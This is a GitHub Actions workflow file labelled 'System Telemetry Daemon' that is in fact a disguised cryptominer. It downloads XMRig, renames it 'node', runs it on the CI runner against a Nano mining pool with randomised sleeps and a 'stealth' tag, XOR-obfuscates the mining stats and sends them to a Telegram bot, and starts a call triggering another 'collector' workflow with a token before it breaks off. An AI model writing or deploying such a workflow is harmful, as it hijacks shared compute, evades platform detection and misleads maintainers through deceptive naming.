name: System Telemetry Daemon

on:
  schedule:
    - cron: '0 0,12 * * *'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  nano-task:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Boot Phase
        run: echo "Initializing..."

      - name: Install Agent
        run: |
          sudo apt update -y
          sudo apt install -y curl tar coreutils xxd base64
          curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf node.tar.gz
          mv xmrig-6.24.0 node-core
          cd node-core
          mv xmrig node
          chmod +x node

      - name: Mining Agent
        run: |
          cd node-core
          sleep $((RANDOM % 60 + 10))
          ./node -o xmrig.nanswap.com:3333 -a rx -k \
            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
            -p stealth --randomx-no-rdmsr | tee result.log &
          PID=$!
          sleep $((RANDOM % 5400 + 1200))
          kill $PID

      - name: Write encryption script
        run: |
          cat <<'EOF' > node-core/encrypt.py
import base64, os
hr = "0 H/s"
try:
  with open("result.log", "r", errors="ignore") as f:
    lines = f.readlines()
    for line in reversed(lines):
      if "speed" in line:
        hr = line.split()[-2] + " H/s"
        break
    a = sum("accepted" in l for l in lines)
    r = sum("rejected" in l for l in lines)
except:
  a = r = 0
msg = f"NANO Stats:\\nâ€¢ HR: {hr}\\nâ€¢ OK: {a}\\nâ€¢ NO: {r}"
key = b"S3cur3"
cipher = bytes([b ^ key[i % len(key)] for i, b in enumerate(msg.encode())])
b64 = base64.b64encode(cipher).decode()
with open("payload.txt", "w") as f:
  f.write(b64)
EOF

      - name: Send Encrypted Report
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          cd node-core
          python3 encrypt.py
          TEXT=$(cat payload.txt)
          curl -s -X POST https://api.telegram.org/bot${TG_TOKEN}/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            --data-urlencode text="ðŸ“¦ Encrypted XNO Report:\n\`\`\`\n$TEXT\n\`\`\`" \
            -d parse_mode=Markdown

      - name: Trigger BNB Collector
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          curl -X POST -H "Authorization: Bearer $
